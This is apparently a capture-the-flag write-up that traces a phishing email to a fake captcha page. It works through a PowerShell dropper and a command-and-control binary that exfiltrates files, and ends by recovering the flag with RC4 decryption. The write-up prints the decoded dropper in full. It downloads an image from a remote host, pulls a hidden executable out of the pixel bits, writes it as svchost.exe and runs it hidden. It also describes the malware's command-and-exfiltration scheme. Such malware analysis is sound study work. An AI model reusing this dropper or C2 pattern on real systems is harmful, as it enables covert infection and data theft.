### TASK.EML

We received a `RFC 822 mail` file which initially was only 300kb in size and i thought this was going to be a super easy malware challenge but as the description suggests `Is this a rabbit? Or a cat? Or a crabbit.` I knew we might be looking forward to a rabbit hole.

Opening the `.eml` file in VS code , we can see that it has an extremely large base64 encoded string ( 4000 lines ).

![image.png](image.png)

but before that got my interest , I looked at the line above that read  `Check out this cat <a href="[https://verifycert.task.sasc.tf/video/view.html](https://verifycert.task.sasc.tf/video/view.html)">video </a>` so as usual i clicked on the first link i saw which had absolutely nothing on the display but every time when i would reload the page , I would see slight glimpse of the captcha, but I wasn't able to click it which was suspicious but I ignored it because i thought it was just a red herring. 

![themole.gif](themole.gif)

Coming back to the `.eml` file and the big base64 

Decoding the base64 string , we get an image of a rabbit, Indeed this guy is very cute but other than that he had nothing with him that would make him useful to us ( sorry bunny ).

![image.png](image%201.png)

So i decided to check out the webpage we got before , maybe i missed something? Since the captcha was not visible properly the next step ( obviously ) would be to check out the page-source.

It was all normal other than that there’s another link present that reads its a mp4 file [Suspicious MP4: cat_rabbit.mp4](https://verifycert.task.sasc.tf/video/cat_rabbit.mp4) , well maybe we will see a bunny hopping around this time but to my horrors its was a `POWERSHELL` script!!! 

### POWERSHELL.PS1

Quickly opening the `ps1`  file we found that it  was base64 encoded too. 

![image.png](image%202.png)

Decoding it we get a pretty small PowerShell script - 
```powershell
Add-Type -AssemblyName System.Drawing
$wc = New-Object System.Net.WebClient
[byte[]]$bytes = $wc.DownloadData('https://verifycert.task.sasc.tf/flag.png')
$ms = New-Object System.IO.MemoryStream(,$bytes)
$bmp = New-Object System.Drawing.Bitmap($ms)

function BitsToByte {
    param([bool[]]$bits, [int]$startIndex)
    $val = 0
    for ($i = 0; $i -lt 8; $i++) {
        if ($bits[$startIndex + $i]) { $val = $val -bor (1 -shl $i) }
    }
    return [byte]$val
}
$bitList = New-Object 'System.Collections.Generic.List[bool]'
for ($y = 0; $y -lt $bmp.Height; $y++) {
    for ($x = 0; $x -lt $bmp.Width; $x++) {
        $r = $bmp.GetPixel($x, $y).R
        [void]$bitList.Add(($r -band 1))
    }
}
$bits = $bitList.ToArray()
$sizeBytes = 0..3 | ForEach-Object { BitsToByte $bits ($_ * 8) }
$payloadLen = [BitConverter]::ToInt32($sizeBytes, 0)
$payload = New-Object byte[] $payloadLen
for ($b = 0; $b -lt $payloadLen; $b++) {
    $payload[$b] = BitsToByte $bits (32 + $b * 8)
}
$dir = Join-Path $env:LOCALAPPDATA 'temp'
$outFile = Join-Path $dir 'svchost.exe'
[System.IO.File]::WriteAllBytes($outFile, $payload)
Start-Process -FilePath $outFile -WindowStyle Hidden
```
In a nutshell this script is - 
- Downloading an image from a remote server.
- Extracting hidden data from the least significant bits (LSBs) of the image’s pixels.
- Reconstructs a binary executable from the hidden data.
- Saves it to disk as `svchost.exe`.
- Silently executes the hidden payload.

We see that there are 2 Important things

 1. `https://verifycert.task.sasc.tf/flag.png`
 2. `$outFile = Join-Path $dir 'svchost.exe'`

Even if we don't dive deep into understanding the PowerShell script at first , we know that whatever is happening , its going to lead us to `svchost` so i decided to check out our flag.png url and well well well! just how i thought that we would run into a rabbit hole , we did. 

![image.png](image%203.png)

Well this is what i thought at first at least but after reading the rest of the PowerShell code, we can determine that this png is used to get `svchost.exe` so i download the file and  asked GPT to write a script to extract the exe from the image based on what we understand from the script.
 
```python
#!/usr/bin/env python3
import os
import requests
from io import BytesIO
from PIL import Image

def bits_to_byte(bits, start_index):
    """Convert 8 bits in little-endian order starting at start_index into one byte."""
    val = 0
    for i in range(8):
        if bits[start_index + i]:
            val |= (1 << i)
    return val

def main():
    # 1) Download the PNG
    url = 'https://verifycert.task.sasc.tf/flag.png'
    resp = requests.get(url)
    resp.raise_for_status()
    print('open image')
    # 2) Load into a PIL image
    img = Image.open(BytesIO(resp.content)).convert('RGB')
    width, height = img.size
    print('Getting lsb')
    # 3) Extract LSBs of red channel into a flat list of 0/1
    bits = []
    for y in range(height):
        for x in range(width):
            r, _, _ = img.getpixel((x, y))
            bits.append(r & 1)

    # 4) First 32 bits = little-endian 4-byte payload length
    size_bytes = bytes(bits_to_byte(bits, i * 8) for i in range(4))
    payload_len = int.from_bytes(size_bytes, byteorder='little', signed=False)

    # 5) Extract the payload bytes
    payload = bytearray(payload_len)
    for i in range(payload_len):
        payload[i] = bits_to_byte(bits, 32 + i * 8)

    # 6) Write to disk (current directory)
    out_path = os.path.abspath('svchost.exe')
    with open(out_path, 'wb') as f:
        f.write(payload)

    print(f'Payload saved to: {out_path}')

if __name__ == '__main__':
    main()
```

My next step was to checkout this exe in virustotal to see the overall behavior since it was a malware  challenge and we can see that it does `GET` and `PUT` for a file called `exfiltr8.txt` 

![image.png](image%204.png)

Opening them just gives us garbage text but it was most likely the thing that we might needed to decrypt somehow.
We can also see that it does a shell command `"cmd" /C "type flag.txt"` but that was about it what virustotal could have helped us in but since we had the exe now , we weren't too far off the flag. 

### SVCHOST.EXE

Checking out the `svchost.exe` , The file size is over 4MB and it is stripped, meaning all symbol information has been removed. To recover function names and better understand the code, I used the tool [Cerberus](https://github.com/h311d1n3r/Cerberus). This allowed me to recover approximately 30% of the functions.

We can find that the program communicates with the following endpoints: `http://backupstorage.task.sasc.tf/in/exfiltr8.txt` & `http://backupstorage.task.sasc.tf/out/exfiltr8.txt`.

![image.png](diagram.png)

The first request to the `in` endpoint succeeds, but the second request to the `out` endpoint fails with a 400 error (likely due to the server rejecting the file write)

![image.png](image%205.png)

To analyze further, we can set up a simple WebDAV server using `wsgidav` to emulate the original server. I downloaded the `in/exfiltr8.txt` file and placed it in the corresponding directory. 

Using Process Monitor, I observed that the executable spawns a `cmd` process and runs the command `cmd /C "type flag.txt"`( which we already did find through Virus Total before ), originating from address `0x1402D4072` within `svchost.exe`.

![image.png](image%206.png)

![image.png](image%207.png)

I created a test `flag.txt` file, and noticed that changes to this file resulted in different content being written to `out/exfiltr8.txt`.  Also, the `type flag.txt` command itself changes depending on the content of `in/exfiltr8.txt`. 

This indicates that the binary is a remote code execution (RCE) malware. It downloads an instruction file from `/in/exfiltr8.txt`, decrypts and executes it, then encrypts the output and uploads it to `/out/exfiltr8.txt`.

After some more reversing , my teammate tien determined that the `/in/exfiltr8.txt` content is decrypted using a function at `sub_1402C8550` to produce the command `type flag.txt`. Further debugging revealed that the function `sub_14004BCB0` is used to encrypt the flag. It takes the following parameters:

```markdown
- `a1`: output buffer
- `a2`: the key, specifically the bytes:  
  `09 DC 6E 7F 77 82 A4 B5 87 7B D0 26 7F C3 60 5F DF E1 26 B9 5A 46 C0 BE 63 D0 74 0E E8 0E EE 46`
- `a3`: length of the key, 32 bytes
- `a4`: input data (plaintext)
- `a5`: input length
```

The function implements a stream cipher algorithm similar to RC4, consisting of two phases: Key Scheduling Algorithm (KSA) and Pseudo-Random Generation Algorithm (PRGA).

To reverse the encryption and recover the original plaintext, we used the following Python script:
```python
import base64

def rc4_crypt(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    output = bytearray(len(data))
    i = j = 0
    for k in range(len(data)):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % 256
        output[k] = data[k] ^ S[t]
    
    return output

key = bytes.fromhex("09DC6E7F7782A4B5877BD0267FC3605FDFE126B95A46C0BE63D0740EE80EEE46")
encrypted_data_base64 = "AYKd3hGoR6yEtRBeK6S8THh8QlqX/31kHPm1EK0OHRcMPJiQQLZ0dWWbkF5+Zg=="
encrypted_data = base64.b64decode(encrypted_data_base64)

decrypted_data = rc4_crypt(key, encrypted_data)
print("Decrypted data", decrypted_data.decode('utf-8', errors='ignoree'))
```

and Voila!!!!

We get our flag :  `SAS{c475_w17h_r4bb17_34r5_c4n_d3liv4r_m4lw4r3}`
